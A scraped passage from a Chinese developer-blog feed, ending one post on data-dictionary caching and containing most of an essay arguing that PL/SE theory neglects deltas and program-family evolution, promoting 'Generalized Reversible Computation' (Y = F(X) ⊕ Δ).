<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYangGong-Zi%2FUnusual-Server" target="_blank" title="https://github.com/YangGong-Zi/Unusual-Server" ref="nofollow noopener noreferrer">Unusual-Server (github)</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2FYancy_Hill%2Funusual-server" target="_blank" title="https://gitee.com/Yancy_Hill/unusual-server" ref="nofollow noopener noreferrer">Unusual-Server (gitee)</a></p>
<p>vue3前端</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwzwdream%2FUnusual-Admin" target="_blank" title="https://github.com/wzwdream/Unusual-Admin" ref="nofollow noopener noreferrer">Unusual-Admin (github)</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fwang-zewei-dream%2FUnusual-Admin" target="_blank" title="https://gitee.com/wang-zewei-dream/Unusual-Admin" ref="nofollow noopener noreferrer">Unusual-Admin (gitee)</a></p>
<h2 data-id="heading-25">结语</h2>
<p>本文介绍了四种主流的数据字典实现方案，从全量加载到按需加载，从无缓存到版本校验缓存，每种方案都展现了其独特的优势与缺点。通过对比分析，我们不难发现，没有一种方案能够适用于所有场景，而是需要根据项目的具体特性进行灵活选择。对于字典稳定且量小的项目，全量缓存方案能够带来极致的响应速度；对于字典频繁更新的场景，版本校验缓存方案则能在保障数据实时性的同时，实现存储空间与网络请求的平衡优化。未来，随着技术的不断进步与应用场景的不断拓展，数据字典的实现方案也将持续演进。</p>
<blockquote>
<p>博客主要记录一些学习的文章，如有不足，望大家指出，谢谢。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[目前主流的程序语言与软件工程研究中真正严重的缺陷是什么？]]></title>    <link>https://juejin.cn/post/7581750253000572963</link>    <guid>https://juejin.cn/post/7581750253000572963</guid>    <pubDate>2025-12-10T02:35:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581750253000572963" data-draft-id="7581870491756740643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="目前主流的程序语言与软件工程研究中真正严重的缺陷是什么？"/> <meta itemprop="keywords" content="后端,架构,数学"/> <meta itemprop="datePublished" content="2025-12-10T02:35:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="canonical_entropy"/> <meta itemprop="url" content="https://juejin.cn/user/4212984289694429"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            目前主流的程序语言与软件工程研究中真正严重的缺陷是什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984289694429/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    canonical_entropy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:35:34.000Z" title="Wed Dec 10 2025 02:35:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读27分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果只从“某种语言不够优雅”“某种方法落地难”来谈缺陷，很容易停留在战术层面。要谈“真正严重的缺陷”，必须下潜到更底层的问题：</p>
<blockquote>
<p>目前主流的程序语言与软件工程理论，是用一种什么样的世界观在看软件？<br/>
而这个世界观，本身遗漏了什么？</p>
</blockquote>
<p>我会从三层来展开：</p>
<ol>
<li>学界主流范式到底在假定一个什么样的世界？这个世界观的边界在哪里？</li>
<li>真正的难题——长期演化与可变性管理——如何被系统性弱化甚至“理论外包”给工程实践？</li>
<li>如果承认这种缺口，可能的替代/补全方向是什么？“结构空间 + 差量（Δ）+ 合并（⊕）”这样的视角能补上什么？它如何把 MDA、SPL、DSL、DDD 等拉回一个统一框架？</li>
</ol>
<p>本文的核心主张，在引入“广义可逆计算（GRC）”之后，可以表述为：</p>
<blockquote>
<p>现有 PL/SE 理论，把“单个程序 + 静态正确性 + 一次性生成”当成中心，<br/>
却缺乏一套<strong>以差量（Δ）、合并（⊕）和程序族演化</strong>为核心的一般理论。</p>
<p>GRC 提出：<br/>
<strong>App = Generator ⊕ Δ</strong>，<br/>
即 <strong>Y = F(X) ⊕ Δ</strong>，<br/>
把“生成”和“演化”统一在一条方程里，把“变化”本身提升为一等公民。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、主流范式的世界观，以及它遮蔽了什么</h2>
<h3 data-id="heading-1">1.1 类型与函数式：离散分类和静态正确性的胜利</h3>
<p>现代编程语言理论最耀眼的成果集中在：</p>
<ul>
<li>类型系统：Hindley–Milner、多态、System F、依赖类型、线性类型、effect system 等；</li>
<li>函数式语义：lambda 演算、denotational semantics、logical relations；</li>
<li>证明助手：Coq、Agda、Lean，把“程序 = 证明”的想法推向工业界。</li>
</ul>
<p>它们解决的是一个非常重要的问题：</p>
<blockquote>
<p>如何在局部、在单个程序或模块上，保证静态安全、语义清晰、行为可预测。</p>
</blockquote>
<p>但它们隐含了一组几乎不被说破的前提：</p>
<ol>
<li>
<p><strong>世界可以用有限/可数的“类型”分类</strong></p>
<ul>
<li>先认为值可以归类到若干 type；</li>
<li>再研究 type 之间的关系（子类型、多态、effect 标记等）；</li>
<li>研究重点是“哪些表达式是合法的”、“如何限制非法行为”。</li>
</ul>
</li>
<li>
<p><strong>关注点放在“一个静态程序”的性质上</strong></p>
<ul>
<li>一份源码、一个 AST，一个编译 artifact；</li>
<li>类型系统确保这一次构造的 artifact 有好性质；</li>
<li>“多版本演进”“变体族”“长期演化轨迹”不是主角。</li>
</ul>
</li>
<li>
<p><strong>默认是封闭世界</strong></p>
<ul>
<li>规格是给定的；</li>
<li>环境相对稳定；</li>
<li>不把“规格自身如何变化”当作一等对象。</li>
</ul>
</li>
</ol>
<p>所以，今天的 PL/类型理论的主线问题可以概括为：</p>
<blockquote>
<p>“如何更好地描述和验证一个<strong>给定程序</strong>的性质？”</p>
</blockquote>
<p>而不是：</p>
<blockquote>
<p>“这门语言所能生成的<strong>所有程序 + 它们所有演化路径</strong>构成什么样的结构空间？”</p>
</blockquote>
<p>把“单个程序”的静态正确性当成中心，把“程序族及其演化结构”当成外围工程问题，这是第一个结构性缺口。</p>
<p>更深一层是：这种以“类型 + 函数”为中心的视角，本质上是一种“等价类 + 变换”的世界观，天然不擅长表达“空间坐标上的场”和“在每个坐标点上附着的差量”。类型关注的是“这一撮值属于同一类”，而不是“这个值在结构空间里的位置”。</p>
<h3 data-id="heading-2">1.2 形式方法：多是“快照级”的，而不是“轨迹级”的</h3>
<p>Hoare 逻辑、模型检测、抽象解释、合约式设计，在安全协议、编译器、关键系统等领域非常成功。典型流程是：</p>
<ol>
<li>给出一个规格 Spec；</li>
<li>给出一个实现 P；</li>
<li>在某个逻辑/模型下证明：P ⊨ Spec。</li>
</ol>
<p>而真实的软件工程长期演化问题更像：</p>
<ul>
<li>Spec 在变（需求变化、不完整、一开始就不完备）；</li>
<li>P 不断有 patch、refactoring、变体定制；</li>
<li>同一“产品线”在不同客户、不同版本上形成一个族。</li>
</ul>
<p>目前形式方法里关于演化的工作是有的（incremental verification、regression verification、delta-oriented modeling 等），但总体上：</p>
<blockquote>
<p>规格/实现/证明，仍然被看作一系列离散快照之间的独立问题，<br/>
而不是一个在“演化空间”上持续运行的轨迹问题。</p>
</blockquote>
<p>换句话说：</p>
<ul>
<li>“某个固定版本 P 是否满足 Spec”有很多理论；</li>
<li>“整个程序族的演化结构是否有界、可控、可逆”几乎没有统一理论。</li>
</ul>
<p>这构成第二个严重缺陷：<strong>缺乏一套“面向演化的形式理论”——把差量、合并、版本族本身作为一等公民对象</strong>。</p>
<h3 data-id="heading-3">1.3 范畴论在 PL 中：从“空间语言”退化成“变换语法”</h3>
<p>范畴论本身是一个极其通用的数学元语言，既可以做代数，也可以做几何/拓扑，用于研究空间和局部数据。但在 PL 社区中的主流用法，大致是：</p>
<ul>
<li>对象 ≈ 类型；</li>
<li>态射 ≈ 函数/程序；</li>
<li>Monad/Functor/Arrow/Applicative ≈ 一套 effect 组合语法。</li>
</ul>
<p>从这一用法出发，范畴论主要被用来：</p>
<ul>
<li>把 effect 抽象掉（IO/State/Exception 都包装成 Monad）；</li>
<li>把复杂逻辑行为表达成纯函数的组合；</li>
<li>给语法构造一个“漂亮的代数骨架”。</li>
</ul>
<p>这非常有用，但它强化了一个 <strong>“变换中心”</strong> 的世界观：</p>
<blockquote>
<p>变换（function）是主角；<br/>
类型是变换的源和靶；<br/>
我们关心的是变换如何组合，而不是这些变换所作用的“空间本体”自身的结构和演化。</p>
</blockquote>
<p>对应到数学史上，这有点像停留在“变换群”阶段，而没有真正转向对“空间本身”的研究：</p>
<ul>
<li>群论可以研究对称变换；</li>
<li>但几何和物理会问：空间是什么？场是什么？局部扰动如何叠加？</li>
</ul>
<p>在 PL 中，我们大量研究“程序作为态射”，“程序组合的规律”，却几乎不研究：</p>
<blockquote>
<p>“语言所生成的全部程序结构，以及这些结构之间所有合法变形/演化构成的空间”是怎样的？<br/>
这个空间有什么坐标？什么是“局部扰动”？沿路径累积扰动产生的“积分”如何定义？</p>
</blockquote>
<p>这导致了三个结果：</p>
<ol>
<li>
<p>范畴论被收编进了“函数式 + 类型语义”的体系，<br/>
很少用于表达“结构空间之间的映射”“多表象之间的关联”。</p>
</li>
<li>
<p>对象被等价于 type 后，“坐标系唯一确定值”“场在每一点赋值”这种概念就很难自然进入理论。
类型在本质上是把一撮值归入一个等价类，而不是把每个点放在坐标系中的唯一位置。</p>
</li>
<li>
<p>研究焦点局限在“变换如何组合”，<br/>
而不是“这些变换作用的程序空间本身长什么样、局部结构如何、微扰如何叠加”。</p>
</li>
</ol>
<p>也就是说：</p>
<blockquote>
<p>范畴论本来可以帮助我们研究“模型空间 + 多表象 + 差量映射”，<br/>
但目前被限缩成了“高度高级的类型语义包装”。</p>
</blockquote>
<p>这在世界观上，是一种“从一开始就选窄了”的用法。</p>
<h2 data-id="heading-4">二、现实世界真正难的问题：长期演化 + 可变性管理</h2>
<p>工程实践中，几乎所有中大型系统的真实问题都绕不开这几个词：</p>
<ul>
<li>版本演化（V1 → V2 → …）；</li>
<li>客户/地区/行业定制（产品线）；</li>
<li>长期维护中的腐化与技术债；</li>
<li>多模型间的一致性和“概念漂移”。</li>
</ul>
<h3 data-id="heading-5">2.1 我们最大的问题从来不是“写出一个干净的 v1.0”</h3>
<p>假设你有一个完美类型安全的语言、一个经过形式验证的编译器，然后你写了一个 v1.0：</p>
<ul>
<li>编译通过；</li>
<li>关键属性验证通过；</li>
<li>部署稳定。</li>
</ul>
<p>接下来五年发生的是：</p>
<ul>
<li>需求变了；</li>
<li>新法规/新政策；</li>
<li>某大客户想要两个奇怪的特性；</li>
<li>旧模块不能停机，只能逐步迁移；</li>
<li>部分团队不同栈维护子系统，各自演化。</li>
</ul>
<p>这时你面对的是：</p>
<ul>
<li>源码树上几十个分支；</li>
<li>数据模型 schema 一遍遍迁移；</li>
<li>配置和 feature flag 满天飞；</li>
<li>文档滞后，模型与代码脱节。</li>
</ul>
<p>在这一堆混乱中：</p>
<blockquote>
<p>我们实际操作的基本单位，不再是“完整程序”，而是各种 granularity 的 <strong>Δ：<br/>
小 patch、schema diff、配置 overlay、DSL fragment 的增删改、rewrite 脚本……</strong></p>
</blockquote>
<p>可以说：<br/>
<strong>在长期演化语境里，一切工程工作都是在操作 Δ。</strong></p>
<p>但这些 Δ 在理论上处于什么地位？</p>
<ul>
<li>在 Git 里，它是文本 diff；</li>
<li>在数据库迁移里，它是 DDL 片段；</li>
<li>在配置里，它是某种 patch/overlay；</li>
<li>在 MDA/低代码平台里，它是“生成后手工改动的一坨”。</li>
</ul>
<p>它们是日常核心，却被视为“工程细节”，被认为是需要被摆脱的噪音和偏移，很少被系统抽象。</p>
<h3 data-id="heading-6">2.2 生成与演化的割裂：F(X) vs “手工改一堆”</h3>
<p>模型驱动工程、代码生成器、低代码平台、模板系统，基本都遵循一个模式：</p>
<ul>
<li>描述一个模型 X；</li>
<li>通过生成器 F(X)，生成骨架或大量样板代码；</li>
<li>然后在生成结果里继续手改、补逻辑、修 bug。</li>
</ul>
<p>现实公式其实是：</p>
<blockquote>
<p>App = F(X) + manual adjustments</p>
</blockquote>
<p>手工调整那一坨有几个显著问题：</p>
<ul>
<li>无结构（散布在各种文件中）；</li>
<li>无统一语义（难以分析）；</li>
<li>不可逆，也很难抽出成 Δ；</li>
<li>模型和生成代码再也同步不回去了。</li>
</ul>
<p>这造成几个典型后果：</p>
<ul>
<li>逃离模型：团队一开始用 MDA/低代码，后来发现生成代码改多了，再也不敢重生成，只好“脱离平台自己干”；</li>
<li>技术债堆积：无法系统梳理哪些变更是“一般性扩展”、哪些是“客户临时 hack”；</li>
<li>平台方束手无策：平台升级一次，下游产品线全部重测，几十个客户各有一套 patch。</li>
</ul>
<p>从理论角度看，这是一个非常鲜明的断裂：</p>
<blockquote>
<p>生成 F(X) 被当作“理论上有价值的东西”，<br/>
Δ（各类定制与演化）被视为“落地过程中的脏活累活”，没有被纳入统一形式框架。</p>
</blockquote>
<p>而 GRC 的核心公式正好改写这个模式：</p>
<pre><code class="hljs language-text" lang="text">App = Generator&lt;DSL&gt; ⊕ Δ
即 Y = F(X) ⊕ Δ
</code></pre>
<p>其中：</p>
<ul>
<li>F(X)：规范化的“主干”，由生成器+DSL 生成；</li>
<li>Δ：结构化差量，收纳所有偏离主干的东西；</li>
<li>⊕：有形式语义和代数性质的合并运算。</li>
</ul>
<p><strong>严重缺陷在于：我们有大量关于 F 的理论，却几乎没有关于 Δ 和 ⊕ 的统一理论。</strong><br/>
GRC 把这两个“黑箱”拉到中心来研究。</p>
<p>进一步说：如果不在语言和模型的层面显式定义“结构坐标”和“差量规则”，Δ 永远只能以“文本 patch/脚本”的形式出现，无法进入理论中心。</p>
<h3 data-id="heading-7">2.3 “可变性管理”停留在枚举扩展点阶段</h3>
<p>软件产品线工程所提出的核心技术问题是所谓的可变性管理。这几乎是一个万能箩筐型的问题。我们在软件开发和演化过程中所遭遇的几乎所有困难都能够很容易的被归因于应对变化的能力不足。</p>
<p>软件产品线（SPL）、feature model、plugin architecture，都在谈 variability management。它们做了不少事情：</p>
<ul>
<li>把特性抽象成 feature；</li>
<li>建图（feature diagram）；</li>
<li>用条件编译、差量模块、策略注入等方式实现变体。</li>
</ul>
<p>但主流实践仍然有几个局限：</p>
<ol>
<li>
<p>扩展点大多是<strong>预先定义的</strong></p>
<ul>
<li>“这里留个 hook，将来客户可以在这里插”？</li>
<li>“这个策略用接口封装起来，以后可以换实现”。</li>
</ul>
<p>这对可预期的变化有效，但对“新变化点随时冒出来”就吃力了。</p>
</li>
<li>
<p>“Core” 和 “Variant” 并不在同一模型空间</p>
<ul>
<li>Core 是某种代码/架构；</li>
<li>feature model 在另一套逻辑树里；</li>
<li>二者之间没有统一的 Δ/⊕ 结构。</li>
</ul>
</li>
<li>
<p>构造与演化依旧是分裂活动</p>
<ul>
<li>Core 是“构造”；</li>
<li>Variant 是“演化/定制”；</li>
<li>不在同一方程里。</li>
</ul>
</li>
</ol>
<p>所以你会看到：</p>
<blockquote>
<p>很多 SPL 实践在 paper 里看起来很优雅，<br/>
真正做大规模产品线时，依然要靠分支 + 手工 diff + 合并大战来撑着。</p>
</blockquote>
<p>本质上，<strong>特征代数缺乏与模型空间的严密绑定，变体仍然太多停留在代码/宏级，而不是语义模型级</strong>。</p>
<blockquote>
<p>根据理论上的分析，可变性管理的真正困难在于如何有效的管控预料之外的（unexpected）变化。如果我们对一个领域非常熟悉，而且领域内的变化方式为有限的几种，那么就可以在关键位置设置几个恰到好处的扩展点，举重若轻的解决可变性问题。但如果变化的可能位置不断增加，变化的方式不断翻新花样（换句话说，也就是变化的自由度不断增加，直至趋于无穷），那么迟早这种变化的自由度会超越手工枚举能够管控的范围。在这种充满未知的演化图景下，我们如何实现对无限多的变化自由度的有效描述和管控？在物理学中，这实际上属于一个已经被解决了的问题。</p>
</blockquote>
<blockquote>
<p>在高中阶段我们所学习的牛顿物理学是所谓古典力学中的刚体力学。它的世界观是完全机械化的：刚体的运动完全由它的质心坐标和尺寸形状朝向等少数几个参数来描述，刚体的内部构造无法被观测也无关紧要，刚体之间通过直接接触发生相互作用，刚体的形状必须精确匹配才能构成一个无缝的整体（可以对比一下软件组件的黑箱模型）。即使是在古典力学中，稍微高级一点的观点也都会转换到拉格朗日表述或者哈密尔顿表述，它的精神实质是转向场论的世界观。所谓的场（Field），其实就是建立一个无所不在的坐标系，然后在坐标系的每一点上都可以指定一个物理量。场的自由度是无限的，但是通过坐标系它是可描述的、可定义的、可研究的，在坐标系的每一点上我们都可以精确的度量局部的变化。基于同样的精神，可逆计算的基本设定是首先建立一个足够精细和通用的领域描述坐标系，在这个坐标系中我们能够做到指哪打哪和打哪指哪（坐标的唯一性）。</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">三、核心缺陷归纳：缺的不是“更强类型”，而是一套关于“变化”的科学</h2>
<p>把上述问题压缩，可以勾勒出当前 PL/SE 理论的几个结构性短板。</p>
<h3 data-id="heading-9">3.1 研究重心放错层级：聚焦“单个程序”，忽视“程序族”</h3>
<ul>
<li>我们在“单一程序 P 的类型安全、语义正确性”上，几乎做到了极致；</li>
<li>对“程序族 {P₀, P₁, …, Pₙ} 的结构与演化”，只有零碎的理论，不成主线。</li>
</ul>
<p>换句话说：</p>
<blockquote>
<p>类型论之于静态安全，已经是一门成熟的“科学”；<br/>
而关于“长期演化及其结构”的东西，还散落在多个子领域，缺乏总理论。</p>
</blockquote>
<h3 data-id="heading-10">3.2 差量（Δ）与合并（⊕）没有被当作一等数学对象</h3>
<p>现实中我们不断“发明”差量：</p>
<ul>
<li>Git 有行文本 diff + merge，但语义弱、噪声高、合并无封闭性；</li>
<li>产品线有 feature algebra，但通常与实现 artifact 之间存在巨大鸿沟；</li>
<li>AOP 提供了一种“织入式差量”，但切点是基于脆弱的代码模式；</li>
<li>Lenses/BX 把 Δ 引入视图更新问题，但通常只在 A↔B 两个模型的同步范围内。</li>
</ul>
<p>这些差量存在的问题是：</p>
<ul>
<li>语义不统一；</li>
<li>公理不明确；</li>
<li>层次混乱（文本级、语法级、语义级混在一起）。</li>
</ul>
<p>缺的是：</p>
<blockquote>
<p>在“模型/DSL空间”中，建立统一的<strong>差量代数</strong>：</p>
<ul>
<li>明确定义 Δ 的结构；</li>
<li>定义 ⊕ 的闭包、结合律、单位元、局部逆；</li>
<li>把可追踪、可合并、可回滚、可逆这些需求，变成代数性质。</li>
</ul>
</blockquote>
<p>换句话说：</p>
<ul>
<li>我们无数次在实践里“发明”差量：schema diff、config overlay、patch、plugin；</li>
<li>却没有把它们拉回同一张黑板上，用同一套符号和公理来刻画。</li>
</ul>
<p>而传统类型系统的等价类思维，本能关注的是“哪些值是同一类”，而不是“一个结构位点上的微扰 Δ 如何叠加、相消、可逆”，这使得差量和场论天然被排除在理论视野之外。</p>
<h3 data-id="heading-11">3.3 语言被定义成“语法 + 类型 + 求值规则”，而不是“结构空间 + 坐标 + 演化路径”</h3>
<p>主流对语言的隐含定义：</p>
<blockquote>
<p>语法（BNF） + 类型系统 + 操作语义（或 denotational semantics）</p>
</blockquote>
<p>它回答的是：</p>
<ul>
<li>哪些表达式是合法的？</li>
<li>它们如何运行？</li>
</ul>
<p>但它不直接回答：</p>
<ul>
<li>这门语言能生成的<strong>全部程序结构 S</strong> 是什么？</li>
<li>在 S 上，什么是“合法变形/演化 Δ”？</li>
<li>Δ 如何组合、是否可逆、是否有度量？</li>
<li>一条演化路径 Δ₁ ⊕ Δ₂ ⊕ … ⊕ Δₙ 的“形状”可以怎样分析？</li>
</ul>
<p>如果不先把“结构空间”当成语言本体，要谈：</p>
<ul>
<li>场（field）；</li>
<li>微扰（perturbation）；</li>
<li>演化路径上的累计效应（类似积分）；</li>
</ul>
<p>都会非常尴尬。</p>
<p>而如果改用 GRC 式的定义：</p>
<blockquote>
<p>一门语言定义了一种程序结构空间 S，<br/>
语言是构造 S 中元素的规则，<br/>
并在 S 上给出差量 Δ 与合并 ⊕ 的语义。</p>
</blockquote>
<p>那么程序/模型不再只是“语法树”，<br/>
而是“空间上的点”；演化操作就是“在空间上施加的 Δ”。</p>
<p>从这个视角再看现实语言，就能看到差异：</p>
<ul>
<li>常规语言：BNF + 类型规则 + 求值语义，但不显式给出“结构空间 + Δ 规则”；</li>
<li>XLang：
<ul>
<li>有 XDef 作为统一元模型，定义领域结构坐标；</li>
<li>在每个坐标点支持 (data, ext_data) 这种“主体 + 扩展”的成对结构；</li>
<li>内置差量叠加规则，与 <code>Y = F(X) ⊕ Δ</code> 范式自然契合。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-12">3.4 软件产品线 / 多模型协同缺乏统一“空间观”</h3>
<p>现实的大型系统，存在大量不同层次的模型：</p>
<ul>
<li>数据模型（ORM/Schema）；</li>
<li>业务流程（Workflow DSL）；</li>
<li>UI 描述；</li>
<li>配置；</li>
<li>代码；</li>
<li>部署拓扑（Kubernetes YAML 等）。</li>
</ul>
<p>这些 artifact 之间存在映射关系，但：</p>
<ul>
<li>大多数工具只在某一层做一点转换（ORM 生成 DAO、API 生成 SDK 等）；</li>
<li>没有一个统一“模型空间 Atlas”的框架，把这些模型视为不同表象的“同一语义核心”的多种表示；</li>
<li>变化往往在某一层硬 patch，无法系统地反向传播或同步到其他层。</li>
</ul>
<p>这导致：<br/>
多模型系统的演化 = 各层分别演化 + 人工同步 + 不断累积概念漂移。</p>
<p><strong>严重缺陷就是：我们没有把多模型协同当作一个“多坐标系 + 可逆变换 + 差量传播”的统一问题来建模。</strong></p>
<hr/>
<h2 data-id="heading-13">四、广义可逆计算(GRC)：以“结构空间 + Δ + ⊕”为中心的演化范式</h2>
<p>前面描述的是缺口，下面引入 GRC，作为一个已经部分成型的补全方向。</p>
<h3 data-id="heading-14">4.1 一个核心公式：Y = F(X) ⊕ Δ</h3>
<p>GRC 用一个统一公式刻画软件构造与演化：</p>
<pre><code class="hljs language-text" lang="text">App = Delta x-extends Generator&lt;DSL&gt;
即 Y = F(X) ⊕ Δ
</code></pre>
<p>解释：</p>
<ul>
<li>Y：目标系统（应用）；</li>
<li>X：模型（DSL 实例）；</li>
<li>F(X)：由 Generator 根据 DSL/模型生成的主体部分；</li>
<li>Δ：差量，用于定制、调整、补充；</li>
<li>⊕：差量合并运算，要求具备明确的代数属性（至少结构层面上的结合、单位元、闭包）。</li>
</ul>
<p>这可以从三种视角理解：</p>
<ol>
<li>工程视角：<strong>结果 = 生成的主体 + 可控的差量</strong>；</li>
<li>数学视角：类似小波分析的“近似 + 细节”分解；</li>
<li>哲学视角：从“静态实体”的本体论转向“生成与演化”的过程本体论。</li>
</ol>
<p>这条公式可以在所有层级递归展开：</p>
<ul>
<li>应用层：App = Generator(DomainDSL) ⊕ Δ_app</li>
<li>模型层：DomainDSL = DslGenerator(MetaModel) ⊕ Δ_dsl</li>
<li>元模型层：MetaModel' = MetaModel ⊕ Δ_metamodel</li>
<li>工具层：Generator2 = Generator1 ⊕ Δ_generator</li>
</ul>
<p>一旦接受这个公式，很多传统矛盾可以系统化重写：</p>
<ul>
<li>
<p>标准化 vs 灵活性：</p>
<ul>
<li>F(X) 追求极致标准化、自动化；</li>
<li>Δ 提供极致定制、灵活性；</li>
<li>⊕ 保证组合仍可控、可追踪。</li>
</ul>
</li>
<li>
<p>生成 vs 手工修改：</p>
<ul>
<li>不再是“生成 + 不可重放的 manual hack”；</li>
<li>而是“生成 + 显式结构化 Δ”；</li>
</ul>
</li>
<li>
<p>核心产品 vs 客户定制：</p>
<ul>
<li>Effective System = Base ⊕ Δ_Industry ⊕ Δ_Region ⊕ Δ_Customer；</li>
